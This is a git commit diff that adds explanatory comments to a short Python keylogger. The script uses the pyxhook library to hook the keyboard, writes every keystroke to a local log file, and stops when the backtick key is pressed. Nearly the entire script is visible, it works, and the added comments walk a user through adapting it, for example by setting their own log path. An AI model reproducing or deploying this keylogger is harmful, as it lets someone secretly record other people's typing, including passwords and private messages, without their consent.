b928cb292647c77a52db527cb67f8605e0da4203
hiamandeep <amandeep1024@gmail.com>
2015-10-26 15:06:26 +0530

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -1,7 +1,8 @@
 import pyxhook
-
+#change this to your log file's path
 log_file='/home/aman/xxx/file.log'
 
+#this function is called everytime a key is pressed.
 def OnKeyPress(event):
   fob=open(log_file,'a')
   fob.write(event.Key)
@@ -10,8 +11,10 @@ def OnKeyPress(event):
   if event.Ascii==96:
     fob.close()
     new_hook.cancel()
-
+#create a new hook manager instance
 new_hook=pyxhook.HookManager()
+#set KeyDown variable to function to execute when a key is pressed
 new_hook.KeyDown=OnKeyPress
 new_hook.HookKeyboard()
+#start the recording keys
 new_hook.start()
